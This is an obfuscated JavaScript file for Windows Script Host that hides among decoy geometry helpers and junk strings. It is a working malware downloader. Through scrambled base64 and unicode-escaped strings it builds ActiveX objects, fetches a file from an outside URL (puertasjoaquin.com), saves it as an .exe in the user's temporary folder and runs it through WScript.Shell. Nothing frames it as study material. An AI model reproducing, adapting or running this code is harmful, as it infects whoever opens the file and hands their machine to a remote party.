
var walls = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  prettier = [];
	
var prevention = { ':': '.','U': 'S','381': 'X'};
	var leasing = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function underlying(languor) {
	block = languor;
	for (var i in prevention){block = block.replace(i, prevention[i]);}
    return block;
};

var buses = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.underlying4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/geordie/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = walls[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = walls[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = walls[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = walls[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var hobbies ="geordieJVgeordieRFTVgeordieAl".underlying4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var hereby = "geordieQWgeordieN0aXZgeordielWE9iageordiemVjdA=geordie=".underlying4();
String.prototype.underlying2 = function () {
    var grunt = {
        lenses: this
    };
    grunt.gelatinous = grunt.lenses["c3Vic3RyaW5n".underlying4()](leasing, buses);
    return grunt.gelatinous;
};

var clove ="geordieRXhwYW5geordiekRW52aXgeordieJvbm1lbnRTdHJgeordiepbmdz".underlying4();
var Native = function(options){
	
};
var reticent = [hereby, clove,hobbies,  ""+"."+("consultant","sirrah","phone","pears","append","sharpness","powerful","match","exe"), "UnVu".underlying4(), underlying("M"+"SX"+"ML"+("maritime","unchallenged","verandah","beaux","optical","counsel","quickly","2.")+"381M"+"LH"+"TT"+("check","inhospitable","surveys","therefor","generative","incidence","approaches","egyptian","P>")+"WU"+("screech","pretense","priceless","trenchant","punctual","montgomery","rebel","cr")+("slipper","traffic","ballot","portsmouth","thirtyone","rapids","jurisdiction","light","ip")+"t:"+("steam","remix","inflection","operations","adjunct","britain","parsonage","spree","Sh")+"ell")];
prostitution = "_F2_";
var preservation = this[reticent.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
CKrpljk = "DLvrvpwBC";
futility = (("papal", "vitiated", "elasticity", "chaff", "anvil", "bulldog", "timorous", "pvRKtij") + "cWRCipUVOX").underlying2();
prefect = (("larceny", "surgical", "whoop", "kinsmen", "metres", "eliminate", "sadden", "eclat", "dictionaries", "sjSWuLFM") + "MVCBkfjSc").underlying2();
  
    String.prototype.stacy = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var purposed = reticent.pop().split(">");

finance = "b3Blbg==".underlying4();
var officers = new preservation(purposed[1]);
var fighters = new preservation(purposed[0]);
var sudan = officers[reticent.shift()](reticent.shift());
weasel = "E";

var shaving = reticent.shift();
var emissary = reticent.shift();
function smell(requirement, foolscap) {

    try {
        var david = sudan + "/" + foolscap ;
		david = david+ shaving;
            fighters[finance](("tamil","concierge","testator","wicker","watches","suzuki","slovak","pennies","G" + weasel) + ("devious","progressive","bottles","minnesota","cucumber","shutter","calabria","mammon","pellucid","phrase","T"), requirement, false);
       
    fighters[prefect + ("between","attractive","end")]();
	var lifestyle=("futility" + WScript=="futility" + "V2luZG93cyBTY3JpcHQgSG9zdA==".underlying4())&&fighters["c3RhdHVz".underlying4()] +""=="MjAw".underlying4()&&typeof(zjChAilr)==="undefined";

    if (lifestyle) {
		
        var angels = new preservation((("posted","solutions","women","springfield","operator","gymnastic","sections","groin","A")+("efficient","counterfeit","disciplines","sharing","sloped","horror","costume","filipino","SEOO")+"DB"+("broker","lessons","commercial","adhesive","protege","vishnu","conversant",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        angels[finance]();
        vvAuGr = "_F9_";
        angels.type = buses;
        sJfbfe = "_F10_";
        angels["d3JpdGU=".underlying4()](fighters[("gentleman","forum","scales","approximately","constraint","regulated","inborn","")+"R"+"es"+"pon"+prevention['U'].toLowerCase()+"e"+"Qm9keQ==".underlying4()]);
        GvQzvHxXw = "_F11_";
        angels[(futility + "o"+("refectory","parrot","hyacinth","cognate","alternatively","secretariat","fruition","script","00")+("regime","comments","infidel","advancement","refraction","reforms","microwave","8i")+"tion").replace("0"+("dividend","scrutinize","cypress","corroborate","packard","sharpness","underlying","08"), prefect)] = 0;
        wpOMbrNiuAq = "_F12_";
        angels.saveToFile(david, 2);
        mAUkdL = "_F13_";
        angels.close();
        NbtuCUKJ = "_F14_";
		officers[emissary](david, buses, true);
    }
} catch (OIGxYIXrBt) { };

    sqRKCqB = "_F15_";
}
try{
smell("aHRgeordie0cDgeordieovLw=geordie=".underlying4()+"\u0077\u0077\u0077"+"\u002E\u0070\u0075\u0065\u0072\u0074\u0061\u0073\u006A\u006F\u0061\u0071\u0075\u0069\u006E\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?pDkEKyH=dTmQpHfsKT","fCCDHIugxjI");}catch(ltAteEeVXrS){}

   xpCbJkyYIxw = "_F16_";
   